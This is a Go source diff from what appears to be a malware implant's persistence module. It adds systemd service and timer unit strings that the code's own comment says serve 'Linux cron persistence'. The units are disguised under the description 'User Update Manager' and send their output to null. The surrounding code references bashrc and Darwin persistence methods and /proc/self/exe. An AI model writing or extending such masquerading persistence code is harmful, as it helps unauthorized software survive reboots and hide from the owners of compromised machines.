@@ -309,13 +309,31 @@ const (
 	// Command name (274)
 	IdxDarwinCmdName = 274 // persist
 
-	_darwinPersistEnd = 279
+	_darwinPersistEnd = 274
+)
+
+// ============================================================================
+// SYSTEMD UNIT FILE STRINGS (275-283)
+// Used by Linux cron persistence to build systemd service/timer units
+// ============================================================================
+const (
+	IdxSysUnitHeader  = 275 // [Unit]
+	IdxSysSvcHeader   = 276 // [Service]
+	IdxSysInstHeader  = 277 // [Install]
+	IdxSysSvcDesc     = 278 // Description=User Update Manager
+	IdxSysTimerDesc   = 279 // Description=User Update Manager Timer
+	IdxSysTypeOneshot = 280 // Type=oneshot
+	IdxSysStdoutNull  = 281 // StandardOutput=null
+	IdxSysStderrNull  = 282 // StandardError=null
+	IdxSysWantedBy    = 283 // WantedBy=timers.target
+
+	_sysdPersistEnd = 289
 )
 
 // ============================================================================
 // TEMPLATE SIZE (ensures all indices have values)
 // ============================================================================
-const TemplateSize = 280
+const TemplateSize = 290
 
 // GetLinuxSystemdTemplate returns the systemd service template for Linux persistence
 func GetLinuxSystemdTemplate(serviceName, description string, userService bool) *PersistenceTemplate {
@@ -543,6 +561,17 @@ func GetLinuxCronTemplate() *PersistenceTemplate {
 
 	// Also include /proc/self/exe
 	tpl[IdxProcSelfExe] = "/proc/self/exe"
+
+	// Systemd unit file strings
+	tpl[IdxSysUnitHeader] = "[Unit]"
+	tpl[IdxSysSvcHeader] = "[Service]"
+	tpl[IdxSysInstHeader] = "[Install]"
+	tpl[IdxSysSvcDesc] = "Description=User Update Manager"
+	tpl[IdxSysTimerDesc] = "Description=User Update Manager Timer"
+	tpl[IdxSysTypeOneshot] = "Type=oneshot"
+	tpl[IdxSysStdoutNull] = "StandardOutput=null"
+	tpl[IdxSysStderrNull] = "StandardError=null"
+	tpl[IdxSysWantedBy] = "WantedBy=timers.target"
 
 	// Persist methods and flags (common across all templates)
 	tpl[IdxPersistMethodBashrc] = "b"
